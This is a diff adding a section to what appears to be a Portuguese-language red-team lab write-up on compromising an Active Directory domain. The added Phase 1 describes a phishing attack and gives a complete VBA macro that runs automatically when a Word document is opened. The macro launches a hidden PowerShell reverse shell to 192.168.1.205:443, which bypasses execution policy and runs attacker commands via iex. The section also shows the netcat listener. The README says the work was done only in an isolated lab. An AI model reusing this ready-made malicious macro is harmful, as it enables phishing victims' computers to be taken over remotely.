@@ -23,3 +23,76 @@ O objetivo final é obter não apenas uma shell no controlador de domínio, mas 
 ---
 
 ⚠️ *Aviso: Este projeto foi realizado exclusivamente para fins educacionais e em ambiente isolado. Nenhuma das técnicas aqui descritas deve ser utilizada em ambientes reais sem autorização explícita.*
+
+
+<br>
+<br>
+
+## 🧪 Fase 1 - Acesso Inicial via Macro em Documento Word (Phishing)
+
+Nesta fase inicial, o atacante utilizou **engenharia social (phishing)** para induzir um colaborador da organização a abrir um documento Word malicioso. O documento continha uma macro em VBA (Visual Basic for Applications) configurada para executar automaticamente ao abrir o ficheiro.
+
+###  Objetivo
+
+Obter uma **shell reversa PowerShell** no sistema da vítima sem levantar suspeitas, utilizando `Wscript.Shell` para evadir políticas de execução e manter a execução em segundo plano.
+
+---
+
+### 📄 Conteúdo da Macro
+
+A macro maliciosa foi inserida no Editor do Visual Basic para Aplicações, dentro do módulo `NewMacros`. O código é dividido em duas partes:
+
+- `AutoOpen()`: executa a macro automaticamente ao abrir o ficheiro
+- `test()`: define e executa o payload PowerShell em modo oculto
+
+```vb
+Sub AutoOpen()
+    Call test
+End Sub
+
+Sub test()
+    ' test Macro
+    Dim objshell As Object
+    Set objshell = CreateObject("Wscript.Shell")
+    objshell.Run "powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command ""$command = {while($true){try {$cl = New-Object System.Net.Sockets.TcpClient('192.168.1.205',443);$st = $cl.GetStream();$rd = New-Object IO.StreamReader($st);$wr = New-Object IO.StreamWriter($st);$wr.AutoFlush = $true;while($cl.Connected){$cmd = $rd.ReadLine();if($cmd -eq 'exit'){break;}try{$res = iex $cmd 2>&1 | Out-String;}catch{$res = $_.Exception.Message;} $wr.WriteLine($res);$wr.Flush();}$cl.Close();}catch{Start-Sleep -Seconds 10;}}}; Start-Process powershell -WindowStyle Hidden -ArgumentList '-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', $command"""
+    Set objshell = Nothing
+End Sub
+
+
+<p align="center">
+ 
+  <br/>
+  <br/>
+  <img src="https://github.com/user-attachments/assets/14196c25-96e6-43dc-b1f4-ce14bd0be6be" height="60%" width="60%"/>
+    <br/>
+    <br/>
+  <p/>
+
+---
+
+### Listener do Atacante
+
+Enquanto o documento era aberto pela vítima, o atacante encontrava-se à escuta na máquina Kali, utilizando `netcat` com `rlwrap` para suportar histórico e edição de linha:
+
+```bash
+rlwrap nc -lvnp 443
+
+<br/>
+  <br/>
+  <img src="https://github.com/user-attachments/assets/1d6fd6d7-a226-44c2-a28a-da105117975d" height="60%" width="60%"/>
+    <br/>
+    <br/>
+  <p/>
+
+**Resumo**
+
+O código PowerShell embutido na macro estabelece uma conexão TCP reversa para o endereço do atacante (192.168.1.205) na porta 443. Após a conexão, o script entra num loop que:
+
+1. Recebe comandos enviados pelo atacante
+
+2. Executa os comandos localmente com Invoke-Expression (iex)
+
+3. Envia a saída da execução de volta através do canal TCP
+
+Este tipo de técnica é comum em ataques fileless, pois evita gravações em disco e contorna políticas de execução do PowerShell.
+
